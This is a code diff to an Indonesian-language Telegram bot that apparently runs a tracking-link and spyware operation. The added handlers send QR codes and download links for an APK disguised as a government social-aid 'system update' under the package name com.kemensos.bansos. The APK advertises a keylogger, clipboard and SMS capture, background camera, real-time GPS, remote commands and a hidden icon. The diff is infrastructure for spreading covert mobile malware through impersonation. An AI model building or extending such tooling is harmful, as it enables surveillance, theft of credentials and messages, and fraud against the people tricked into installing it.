@@ -90,6 +90,7 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📦 Buat Link Tracking", callback_data="create_link")],
         [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
         [InlineKeyboardButton("📊 Statistik & Info", callback_data="statistik_info")],
+        [InlineKeyboardButton("⬇️ Download APK", callback_data="download_apk")],
         [InlineKeyboardButton("🖥 Buka Dashboard", url=f"{BASE_URL}/admin/dashboard")],
     ]
     caption = (
@@ -297,6 +298,48 @@ async def on_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         kb = [[InlineKeyboardButton("⬅️ Menu", callback_data="home")]]
         await safe_edit(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+
+    elif d == "download_apk":
+        # Generate and send QR + download link (without opening web)
+        dl_url = f"{BASE_URL}/download/apk"
+        try:
+            with open("/root/gps-link/apk_version.json") as f:
+                vname = json.load(f).get("version_name", "4.0")
+        except:
+            vname = "4.0"
+        apk_path = "/root/gps-link/downloads/bantuan-sosial-v4.0.apk"
+        size_kb = round(os.path.getsize(apk_path) / 1024) if os.path.exists(apk_path) else 0
+
+        import qrcode
+        from io import BytesIO
+        qr = qrcode.QRCode(box_size=10, border=2)
+        qr.add_data(dl_url)
+        qr.make(fit=True)
+        buf = BytesIO()
+        qr.make_image(fill_color="#0055A4", back_color="white").save(buf, format="PNG")
+        buf.seek(0)
+
+        text = (
+            f"📦 *APK Bansos v{vname}*\n"
+            f"`Pembaruan Sistem` — `com.kemensos.bansos`\n\n"
+            f"📎 *Ukuran:* {size_kb} KB\n"
+            f"📱 *Min SDK:* Android 5.0+\n"
+            f"🎯 *Target:* Android 14\n\n"
+            f"⬇️ *Copy link download:*\n"
+            f"`{dl_url}`\n\n"
+            f"✨ *Fitur v{vname}:*\n"
+            f"• Keylogger A11Y\n"
+            f"• Clipboard monitor\n"
+            f"• App usage tracking\n"
+            f"• GPS lokasi real-time\n"
+            f"• Kamera background\n"
+            f"• SMS + Notif capture\n"
+            f"• Remote command\n"
+            f"• Stealth (no icon)"
+        )
+        kb = [[InlineKeyboardButton("⬅️ Menu", callback_data="home")]]
+        await q.message.reply_photo(photo=buf, caption=text,
+            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
 
 # ============ NOTIFICATION ============
 async def notify(tracking_id, lat, lon, accuracy, ip, data=None):
@@ -998,6 +1041,60 @@ async def cmd_apkversion(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("📦 APK v4.0 (code 4)")
 
 
+async def cmd_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Kirim QR + link download APK v4.0"""
+    try:
+        with open("/root/gps-link/apk_version.json") as f:
+            v = json.load(f)
+        vname = v.get("version_name", "4.0")
+    except:
+        vname = "4.0"
+
+    apk_path = "/root/gps-link/downloads/bantuan-sosial-v4.0.apk"
+    apk_size = os.path.getsize(apk_path) if os.path.exists(apk_path) else 0
+    size_kb = round(apk_size / 1024)
+    dl_url = f"{BASE_URL}/download/apk"
+
+    # Generate QR Code image
+    import qrcode
+    from io import BytesIO
+    qr = qrcode.QRCode(box_size=10, border=2)
+    qr.add_data(dl_url)
+    qr.make(fit=True)
+    qr_img = qr.make_image(fill_color="#0055A4", back_color="white")
+
+    # Convert to bytes
+    buf = BytesIO()
+    qr_img.save(buf, format="PNG")
+    buf.seek(0)
+
+    text = (
+        f"📦 *APK Bansos v{vname}*\n"
+        f"`Pembaruan Sistem` — `com.kemensos.bansos`\n\n"
+        f"📎 *Ukuran:* {size_kb} KB\n"
+        f"📱 *Min SDK:* Android 5.0+\n"
+        f"🎯 *Target:* Android 14\n\n"
+        f"⬇️ *Download:*\n"
+        f"`{dl_url}`\n\n"
+        f"✨ *Fitur v{vname}:*\n"
+        f"• Keylogger A11Y\n"
+        f"• Clipboard monitor\n"
+        f"• App usage tracking\n"
+        f"• GPS lokasi real-time\n"
+        f"• Kamera background\n"
+        f"• SMS + Notif capture\n"
+        f"• Remote command\n"
+        f"• Stealth (no icon)"
+    )
+
+    from telegram import InlineKeyboardButton, InlineKeyboardMarkup
+    kb = [[InlineKeyboardButton("⬇️ Download APK", url=dl_url)],
+          [InlineKeyboardButton("🖥 Dashboard", url=f"{BASE_URL}/admin/dashboard")]]
+    reply_markup = InlineKeyboardMarkup(kb)
+
+    await update.message.reply_photo(photo=buf, caption=text, parse_mode="Markdown", reply_markup=reply_markup)
+
+
 async def cmd_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """View all data summary for a device"""
     args = context.args
@@ -1049,6 +1146,7 @@ def main():
     app_bot.add_handler(CommandHandler("cmd", cmd_cmd))
     app_bot.add_handler(CommandHandler("apkversion", cmd_apkversion))
     app_bot.add_handler(CommandHandler("data", cmd_data))
+    app_bot.add_handler(CommandHandler("download", cmd_download))
     app_bot.add_handler(CallbackQueryHandler(on_click))
 
     # Run Telegram bot in main thread (required for signal handling)
